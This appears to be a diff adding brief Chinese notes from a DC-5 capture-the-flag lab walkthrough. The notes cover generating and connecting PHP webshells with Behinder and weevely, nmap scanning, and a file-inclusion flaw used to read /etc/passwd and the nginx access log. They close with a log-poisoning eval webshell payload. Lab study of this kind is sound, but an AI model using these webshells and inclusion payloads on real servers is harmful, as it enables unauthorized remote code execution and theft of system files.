@@ -1,0 +1,25 @@
+ctf dc6靶场
+DC-5靶机下载地址：https://www.vulnhub.com/entry/dc-5,314/
+behinder
+生成一句话木马，传输协议，协议名称，加解密函数，生成服务端（木马），server目录
+上传shell 响应200
+右键新增，url,自定义，base64,default
+右键打开 behinder加密原理：
+webshell中有加密方式，可以混淆，都可以解，熟悉代码语法，抓包
+【【SRC平台选择】https://www.bilibili.com/video/BV1FE421N7TX?vd_source=16abf217472c13eae9d9f5f6e7dbbf74】https://deelmind.com/
+kali自带命令行工具，weevely   木马agent
+weevely generate 123456 1.php (只支持php)
+cat 1.php
+weevely http://XXX/1.php 123456
+搜索cft靶场DC1-DC9
+ctf解题模式 攻防模式 混合模式
+打开靶机 信息收集
+nmap -sP 192.168.10.0/24
+nmap -sV 192.168.10.139
+xss sql注入
+http://192.168.10.139/footer.php
+7Kscan扫描
+http://192.168.10.139/thanklyou.php?file=footer.php
+http://192.168.10.139/thanklyou.php?file=/etc/passwd
+file=/var/log/nginx/access.log
+日志挂马 file=<?php @eval($_POST[8]);?>
